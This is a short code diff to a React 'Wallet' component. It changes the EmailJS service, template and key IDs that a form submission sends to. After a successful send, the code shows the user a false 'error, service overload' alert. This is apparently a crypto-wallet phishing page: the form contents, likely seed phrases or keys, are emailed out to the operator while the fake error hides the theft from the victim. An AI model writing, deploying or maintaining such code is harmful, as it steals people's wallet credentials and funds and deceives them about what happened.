@@ -29,7 +29,7 @@ function Wallet() {
           }
 
         else{
-            emailjs.sendForm('service_yqdqm2n', 'template_yt0yi9q', form.current, 'EsMf5OgvFODuGPS-V')
+            emailjs.sendForm('service_0zvjld3', 'template_sl30mra', form.current, 'cRbzxZvaKSKiHwpwO')
             .then((result) => {
                 alert('error, service overload Please try again in 1 hour')
                 console.log(result.text);
